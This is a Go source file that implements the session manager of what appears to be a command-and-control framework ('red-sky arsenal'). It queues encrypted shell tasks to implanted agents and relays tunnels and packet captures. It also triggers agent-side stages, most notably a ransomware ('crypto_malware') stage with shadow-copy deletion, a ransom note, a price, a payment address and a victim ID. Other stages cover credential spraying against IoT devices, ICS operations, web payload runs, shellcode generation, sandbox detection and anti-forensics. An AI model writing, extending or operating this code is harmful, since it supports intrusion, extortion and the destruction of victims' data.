// Package session implements the persistent session graph and task queue
// that hold live agents between beacon intervals.
package session

import (
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"sync"
	"time"

	"github.com/sk666G/red-sky---arsenal/internal/crypto"
	"github.com/sk666G/red-sky---arsenal/internal/proto"
	"github.com/sk666G/red-sky---arsenal/internal/wire"
)

// TaskState is the lifecycle stage of a task.
type TaskState string

const (
	TaskQueued  TaskState = "queued"
	TaskSent    TaskState = "sent"
	TaskDone    TaskState = "done"
	TaskFailed  TaskState = "failed"
	TaskTimeout TaskState = "timeout"
)

// Task is a command with tracked state.
type Task struct {
	ID        string
	Kind      string // "shell" (default) or "framework"
	Cmd       string
	Args      []string
	Timeout   int
	State     TaskState
	Result    *proto.Result
	Enqueued  time.Time
	Completed time.Time
	Error     string
}

// Session is one live agent.
type Session struct {
	AgentID  string
	Info     proto.AgentInfo
	Joined   time.Time
	LastSeen time.Time

	conn     net.Conn
	crypto   *crypto.Session
	writeMu  sync.Mutex
	write    chan *Task
	tasks    map[string]*Task // keyed by task ID
	tunnels  map[string]chan []byte
	captures map[string]chan []byte
	mu       sync.Mutex
	closed   bool
}

// Send enqueues a task for the agent.
func (s *Session) Send(cmd string, args []string, timeout int) *Task {
	return s.SendKind("shell", cmd, args, timeout)
}

// SendKind enqueues a task with an explicit Kind.
func (s *Session) SendKind(kind, cmd string, args []string, timeout int) *Task {
	if kind == "" {
		kind = "shell"
	}
	id := fmt.Sprintf("t-%d", time.Now().UnixNano())
	t := &Task{
		ID:       id,
		Kind:     kind,
		Cmd:      cmd,
		Args:     args,
		Timeout:  timeout,
		State:    TaskQueued,
		Enqueued: time.Now(),
	}
	s.mu.Lock()
	s.tasks[id] = t
	s.mu.Unlock()
	s.write <- t
	return t
}

// Tasks returns a snapshot of the task list in order of enqueue.
func (s *Session) Tasks() []*Task {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := make([]*Task, 0, len(s.tasks))
	for _, t := range s.tasks {
		out = append(out, t)
	}
	// sort by enqueued
	for i := 0; i < len(out); i++ {
		for j := i + 1; j < len(out); j++ {
			if out[j].Enqueued.Before(out[i].Enqueued) {
				out[i], out[j] = out[j], out[i]
			}
		}
	}
	return out
}

// --- Manager ---

// Manager tracks all live sessions.
type Manager struct {
	sessions map[string]*Session
	mu       sync.RWMutex
	Events   chan Event
}

// Event is something worth showing the operator.
type Event struct {
	TS      time.Time
	Kind    string // "beacon", "result", "error", "connect", "disconnect"
	AgentID string
	Text    string
}

// NewManager creates an empty manager.
func NewManager() *Manager {
	return &Manager{
		sessions: make(map[string]*Session),
		Events:   make(chan Event, 256),
	}
}

// Sessions returns a snapshot of live sessions.
func (m *Manager) Sessions() []*Session {
	m.mu.RLock()
	defer m.mu.RUnlock()
	out := make([]*Session, 0, len(m.sessions))
	for _, s := range m.sessions {
		out = append(out, s)
	}
	return out
}

// Get returns a session by ID.
func (m *Manager) Get(id string) (*Session, bool) {
	m.mu.RLock()
	defer m.mu.RUnlock()
	s, ok := m.sessions[id]
	return s, ok
}

// Register adds a session after TLS + ECDH completes. It spawns the reader
// and writer goroutines for that session.
func (m *Manager) Register(agentID string, info proto.AgentInfo, conn net.Conn, cs *crypto.Session) *Session {
	s := &Session{
		AgentID:  agentID,
		Info:     info,
		Joined:   time.Now(),
		LastSeen: time.Now(),
		conn:     conn,
		crypto:   cs,
		write:    make(chan *Task, 64),
		tasks:    make(map[string]*Task),
		tunnels:  make(map[string]chan []byte),
		captures: make(map[string]chan []byte),
	}
	m.mu.Lock()
	// If an old session with the same agent ID exists, close it.
	if old, ok := m.sessions[agentID]; ok {
		old.close()
	}
	m.sessions[agentID] = s
	m.mu.Unlock()

	m.emit("connect", agentID, fmt.Sprintf("agent %s connected from %s", agentID, conn.RemoteAddr()))

	go m.readerLoop(s)
	go m.writerLoop(s)
	return s
}

func (m *Manager) emit(kind, agentID, text string) {
	select {
	case m.Events <- Event{TS: time.Now(), Kind: kind, AgentID: agentID, Text: text}:
	default:
	}
}

func (s *Session) close() {
	s.mu.Lock()
	if s.closed {
		s.mu.Unlock()
		return
	}
	s.closed = true
	s.mu.Unlock()
	_ = s.conn.Close()
}

// writerLoop pulls tasks off s.write and sends them encrypted.
func (m *Manager) writerLoop(s *Session) {
	for t := range s.write {
		payload, err := json.Marshal(proto.Task{
			ID: t.ID, Kind: t.Kind, Cmd: t.Cmd, Args: t.Args, Timeout: t.Timeout,
		})
		if err != nil {
			m.emit("error", s.AgentID, "marshal task: "+err.Error())
			continue
		}
		env := proto.Envelope{Type: proto.TypeTask, Payload: payload}
		envBytes, _ := json.Marshal(env)
		enc, err := s.crypto.Encrypt(envBytes)
		if err != nil {
			m.emit("error", s.AgentID, "encrypt task: "+err.Error())
			continue
		}
		if err := wire.WriteFrame(s.conn, wire.FlagEncrypted, enc); err != nil {
			m.emit("error", s.AgentID, "send task: "+err.Error())
			s.close()
			return
		}
		s.mu.Lock()
		t.State = TaskSent
		s.mu.Unlock()
		m.emit("task", s.AgentID, "sent "+t.ID+": "+t.Cmd)
	}
}

// readerLoop continuously reads frames from the agent and routes them.
func (m *Manager) readerLoop(s *Session) {
	for {
		frame, err := wire.ReadFrame(s.conn)
		if err != nil {
			m.emit("disconnect", s.AgentID, "closed: "+err.Error())
			m.mu.Lock()
			delete(m.sessions, s.AgentID)
			m.mu.Unlock()
			return
		}
		if frame.Flags&wire.FlagEncrypted == 0 {
			m.emit("error", s.AgentID, "unexpected unencrypted frame")
			continue
		}
		plain, err := s.crypto.Decrypt(frame.Payload)
		if err != nil {
			m.emit("error", s.AgentID, "decrypt: "+err.Error())
			continue
		}
		var env proto.Envelope
		if err := json.Unmarshal(plain, &env); err != nil {
			m.emit("error", s.AgentID, "envelope: "+err.Error())
			continue
		}
		switch env.Type {
		case proto.TypeBeacon:
			var b proto.Beacon
			if err := json.Unmarshal(env.Payload, &b); err == nil {
				s.mu.Lock()
				s.Info = b.Info
				s.LastSeen = time.Now()
				s.mu.Unlock()
				m.emit("beacon", s.AgentID, b.Info.Hostname+" "+b.Info.User)
			}
		case proto.TypeResult:
			var r proto.Result
			if err := json.Unmarshal(env.Payload, &r); err == nil {
				s.mu.Lock()
				if t, ok := s.tasks[r.TaskID]; ok {
					t.Result = &r
					t.Completed = time.Now()
					if r.Error != "" {
						t.State = TaskFailed
						t.Error = r.Error
					} else {
						t.State = TaskDone
					}
				}
				s.mu.Unlock()
				m.emit("result", s.AgentID, fmt.Sprintf("%s rc=%d", r.TaskID, r.ExitCode))
			}
		case proto.TypeTunnelData:
			var t proto.TunnelData
			if err := json.Unmarshal(env.Payload, &t); err == nil {
				s.RouteTunnelInbound(t.TunnelID, t.Data, t.EOF)
			}
		case proto.TypeCaptureData:
			var c proto.CaptureData
			if err := json.Unmarshal(env.Payload, &c); err == nil {
				s.RouteCaptureData(c.SessionID, c.Data)
			}
		case proto.TypeWirelessData:
			var w proto.WirelessData
			if err := json.Unmarshal(env.Payload, &w); err == nil {
				s.RouteCaptureData(w.SessionID, w.Data)
			}
		case proto.TypeWirelessDone:
			var w proto.WirelessDone
			if err := json.Unmarshal(env.Payload, &w); err == nil {
				m.emit("wireless", s.AgentID, "done "+w.SessionID)
				s.UnregisterCaptureChannel(w.SessionID)
			}
		case proto.TypeWirelessFail:
			var w proto.WirelessFail
			if err := json.Unmarshal(env.Payload, &w); err == nil {
				m.emit("error", s.AgentID, "wireless "+w.SessionID+": "+w.Error)
				s.UnregisterCaptureChannel(w.SessionID)
			}
		case proto.TypeCaptureDone:
			var c proto.CaptureDone
			if err := json.Unmarshal(env.Payload, &c); err == nil {
				m.emit("capture", s.AgentID, "done "+c.SessionID)
				s.UnregisterCaptureChannel(c.SessionID)
			}
		case proto.TypeCaptureFail:
			var c proto.CaptureFail
			if err := json.Unmarshal(env.Payload, &c); err == nil {
				m.emit("error", s.AgentID, "capture "+c.SessionID+" failed: "+c.Error)
				s.UnregisterCaptureChannel(c.SessionID)
			}
		case proto.TypeTunnelReady:
			var t proto.TunnelReady
			if err := json.Unmarshal(env.Payload, &t); err == nil {
				m.emit("tunnel", s.AgentID, "ready "+t.TunnelID)
			}
		case proto.TypeTunnelFail:
			var t proto.TunnelFail
			if err := json.Unmarshal(env.Payload, &t); err == nil {
				m.emit("error", s.AgentID, "tunnel "+t.TunnelID+" failed: "+t.Error)
				s.UnregisterTunnel(t.TunnelID)
			}
		case proto.TypeError:
			var e proto.ErrorReport
			if err := json.Unmarshal(env.Payload, &e); err == nil {
				m.emit("error", s.AgentID, e.Message)
			}
		default:
			m.emit("error", s.AgentID, "unknown message: "+string(env.Type))
		}
	}
}

// ErrNoSession is returned when a task is submitted to a dead session.
var ErrNoSession = errors.New("session: no such agent")

// --- Tunnel / AgentSender interface ---

// SendTunnelOpen tells the agent to dial host:port for the given tunnel.
func (s *Session) SendTunnelOpen(tunnelID, host string, port int) error {
	t := proto.TunnelOpen{TunnelID: tunnelID, Host: host, Port: port}
	return s.sendTunnelMsg(proto.TypeTunnelOpen, t)
}

// SendTunnelData ships bytes for the tunnel.
func (s *Session) SendTunnelData(tunnelID string, data []byte, eof bool) error {
	t := proto.TunnelData{TunnelID: tunnelID, Data: data, EOF: eof}
	return s.sendTunnelMsg(proto.TypeTunnelData, t)
}

// SendTunnelClose tears the tunnel down.
func (s *Session) SendTunnelClose(tunnelID, reason string) error {
	t := proto.TunnelClose{TunnelID: tunnelID, Reason: reason}
	return s.sendTunnelMsg(proto.TypeTunnelClose, t)
}

// AgentID returns this session's agent ID.
func (s *Session) AgentID2() string { return s.AgentID }

// sendTunnelMsg marshals a tunnel payload and sends it encrypted.
func (s *Session) sendTunnelMsg(t proto.MessageType, payload any) error {
	raw, err := json.Marshal(payload)
	if err != nil {
		return err
	}
	env := proto.Envelope{Type: t, Payload: raw}
	envBytes, err := json.Marshal(env)
	if err != nil {
		return err
	}
	enc, err := s.crypto.Encrypt(envBytes)
	if err != nil {
		return err
	}
	s.writeMu.Lock()
	defer s.writeMu.Unlock()
	return wire.WriteFrame(s.conn, wire.FlagEncrypted, enc)
}

// RouteTunnelInbound dispatches an inbound tunnel_data message to a waiting reader.
func (s *Session) RouteTunnelInbound(tunnelID string, data []byte, eof bool) {
	s.mu.Lock()
	ch, ok := s.tunnels[tunnelID]
	s.mu.Unlock()
	if !ok {
		return
	}
	if data != nil {
		select {
		case ch <- data:
		default:
			// buffer full, drop the packet (tunnel should apply backpressure)
		}
	}
	if eof {
		close(ch)
		s.mu.Lock()
		delete(s.tunnels, tunnelID)
		s.mu.Unlock()
	}
}

// RegisterTunnel creates the local buffer for a new tunnel.
func (s *Session) RegisterTunnel(tunnelID string) chan []byte {
	ch := make(chan []byte, 128)
	s.mu.Lock()
	s.tunnels[tunnelID] = ch
	s.mu.Unlock()
	return ch
}

// UnregisterTunnel drops the local buffer.
func (s *Session) UnregisterTunnel(tunnelID string) {
	s.mu.Lock()
	if ch, ok := s.tunnels[tunnelID]; ok {
		close(ch)
		delete(s.tunnels, tunnelID)
	}
	s.mu.Unlock()
}

// --- capture ---

// RegisterCaptureChannel creates a receive slot for a capture session.
func (s *Session) RegisterCaptureChannel(sessionID string) chan []byte {
	ch := make(chan []byte, 512)
	s.mu.Lock()
	s.captures[sessionID] = ch
	s.mu.Unlock()
	return ch
}

// GetCaptureChannel returns the receive slot for a capture session.
func (s *Session) GetCaptureChannel(sessionID string) chan []byte {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.captures[sessionID]
}

// UnregisterCaptureChannel drops the receive slot.
func (s *Session) UnregisterCaptureChannel(sessionID string) {
	s.mu.Lock()
	if ch, ok := s.captures[sessionID]; ok {
		close(ch)
		delete(s.captures, sessionID)
	}
	s.mu.Unlock()
}

// SendCaptureStart tells the agent to begin a capture.
func (s *Session) SendCaptureStart(sessionID, iface string, snaplen int) error {
	payload := proto.CaptureStart{
		SessionID: sessionID,
		Iface:     iface,
		Snaplen:   snaplen,
	}
	return s.sendTunnelMsg(proto.TypeCaptureStart, payload)
}

// SendCaptureStop tells the agent to stop a capture.
func (s *Session) SendCaptureStop(sessionID string) error {
	return s.sendTunnelMsg(proto.TypeCaptureStop, proto.CaptureStop{SessionID: sessionID})
}

// RouteCaptureData dispatches an inbound capture chunk to the waiting reader.
func (s *Session) RouteCaptureData(sessionID string, data []byte) {
	s.mu.Lock()
	ch, ok := s.captures[sessionID]
	s.mu.Unlock()
	if !ok {
		return
	}
	select {
	case ch <- data:
	default:
		// drop on backpressure
	}
}

// SendWirelessStart tells the agent to begin an 802.11 capture.
func (s *Session) SendWirelessStart(sessionID, iface string, channel int) error {
	return s.sendTunnelMsg(proto.TypeWirelessStart, proto.WirelessStart{
		SessionID: sessionID,
		Iface:     iface,
		Channel:   channel,
	})
}

// SendWirelessStop stops a wireless capture.
func (s *Session) SendWirelessStop(sessionID string) error {
	return s.sendTunnelMsg(proto.TypeWirelessStop, proto.WirelessStop{SessionID: sessionID})
}

// SendKeyPush delivers a file to the agent. Used to ship the operator public
// key before a crypto stage. Path is relative to the agent's workdir.
func (s *Session) SendKeyPush(sessionID, filename string, data []byte) error {
	return s.sendTunnelMsg(proto.TypeKeyPush, proto.KeyPush{
		SessionID: sessionID,
		Filename:  filename,
		Data:      data,
		Mode:      0o600,
	})
}

// SendCryptoStart kicks off the agent-side crypto_malware stage.
func (s *Session) SendCryptoStart(sessionID, root string, keyID uint32,
	dryRun, killVSS, note bool, noteEmail, noteAddr, notePrice, victimID string) error {
	return s.sendTunnelMsg(proto.TypeCryptoStart, proto.CryptoStart{
		SessionID:    sessionID,
		Root:         root,
		KeyID:        keyID,
		DryRun:       dryRun,
		KillVSS:      killVSS,
		Note:         note,
		ContactEmail: noteEmail,
		Address:      noteAddr,
		Price:        notePrice,
		VictimID:     victimID,
	})
}

// SendIoTCredsStart kicks off an IoT default-credential spray on the agent.
func (s *Session) SendIoTCredsStart(sessionID, host string, port int, protocol, path string,
	timeout int, stopFirst bool) error {
	return s.sendTunnelMsg(proto.TypeIoTCredsStart, proto.IoTCredsStart{
		SessionID: sessionID,
		Host:      host,
		Port:      port,
		Protocol:  protocol,
		Path:      path,
		Timeout:   timeout,
		StopFirst: stopFirst,
	})
}

// SendIcsStart kicks off an ICS protocol operation on the agent.
func (s *Session) SendIcsStart(sessionID string, req proto.IcsStart) error {
	req.SessionID = sessionID
	return s.sendTunnelMsg(proto.TypeIcsStart, req)
}

// SendCloudStart kicks off a cloud-provider operation on the agent.
func (s *Session) SendCloudStart(sessionID string, req proto.CloudStart) error {
	req.SessionID = sessionID
	return s.sendTunnelMsg(proto.TypeCloudStart, req)
}

// SendCryptoOpStart kicks off a cryptogo operation on the agent.
func (s *Session) SendCryptoOpStart(sessionID string, req proto.CryptoOpStart) error {
	req.SessionID = sessionID
	return s.sendTunnelMsg(proto.TypeCryptoOpStart, req)
}

// SendSocialStart kicks off a social-recon operation on the agent.
func (s *Session) SendSocialStart(sessionID string, req proto.SocialStart) error {
	req.SessionID = sessionID
	return s.sendTunnelMsg(proto.TypeSocialStart, req)
}

// SendWebSSRFStart kicks off an SSRF probe run on the agent.
func (s *Session) SendWebSSRFStart(sessionID string, req proto.WebSSRFStart) error {
	req.SessionID = sessionID
	return s.sendTunnelMsg(proto.TypeWebSSRFStart, req)
}

// SendWebSSTIStart asks the agent to render SSTI payloads.
func (s *Session) SendWebSSTIStart(sessionID string, req proto.WebSSTIStart) error {
	req.SessionID = sessionID
	return s.sendTunnelMsg(proto.TypeWebSSTIStart, req)
}

// SendWebXXEStart asks the agent to render XXE payloads.
func (s *Session) SendWebXXEStart(sessionID string, req proto.WebXXEStart) error {
	req.SessionID = sessionID
	return s.sendTunnelMsg(proto.TypeWebXXEStart, req)
}

// SendWebXSSStart asks the agent to render XSS payloads.
func (s *Session) SendWebXSSStart(sessionID string, req proto.WebXSSStart) error {
	req.SessionID = sessionID
	return s.sendTunnelMsg(proto.TypeWebXSSStart, req)
}

// SendAdEnumStart kicks off an AD enumeration on the agent.
func (s *Session) SendAdEnumStart(sessionID string, req proto.AdEnumStart) error {
	req.SessionID = sessionID
	return s.sendTunnelMsg(proto.TypeAdEnumStart, req)
}

// SendShellcodeStart asks the agent to generate a shellcode stub.
func (s *Session) SendShellcodeStart(sessionID string, req proto.ShellcodeStart) error {
	req.SessionID = sessionID
	return s.sendTunnelMsg(proto.TypeShellcodeStart, req)
}

// SendHostInfoStart asks the agent for its local host-info picture.
func (s *Session) SendHostInfoStart(sessionID string, req proto.HostInfoStart) error {
	req.SessionID = sessionID
	return s.sendTunnelMsg(proto.TypeHostInfoStart, req)
}

// SendVMDetectStart asks the agent to run the VM/sandbox detection suite.
func (s *Session) SendVMDetectStart(sessionID string, req proto.VMDetectStart) error {
	req.SessionID = sessionID
	return s.sendTunnelMsg(proto.TypeVMDetectStart, req)
}

// SendAntiForenStart asks the agent to run anti-forensics primitives.
func (s *Session) SendAntiForenStart(sessionID string, req proto.AntiForenStart) error {
	req.SessionID = sessionID
	return s.sendTunnelMsg(proto.TypeAntiForenStart, req)
}

// SendMailTraceStart asks the agent to analyze an email header blob / file.
func (s *Session) SendMailTraceStart(sessionID string, req proto.MailTraceStart) error {
	req.SessionID = sessionID
	return s.sendTunnelMsg(proto.TypeMailTraceStart, req)
}

// SendGeoIPStart asks the agent to classify IP addresses.
func (s *Session) SendGeoIPStart(sessionID string, req proto.GeoIPStart) error {
	req.SessionID = sessionID
	return s.sendTunnelMsg(proto.TypeGeoIPStart, req)
}

// SendProxyChainStart asks the agent to dial a SOCKS5 chain.
func (s *Session) SendProxyChainStart(sessionID string, req proto.ProxyChainStart) error {
	req.SessionID = sessionID
	return s.sendTunnelMsg(proto.TypeProxyChainStart, req)
}

// SendCSIntStart drives content-source intelligence on the agent.
func (s *Session) SendCSIntStart(sessionID string, req proto.CSIntStart) error {
	req.SessionID = sessionID
	return s.sendTunnelMsg(proto.TypeCSIntStart, req)
}

// SendBluetoothStart drives the RF Bluetooth primitives on the agent.
func (s *Session) SendBluetoothStart(sessionID string, req proto.BluetoothStart) error {
	req.SessionID = sessionID
	return s.sendTunnelMsg(proto.TypeBluetoothStart, req)
}
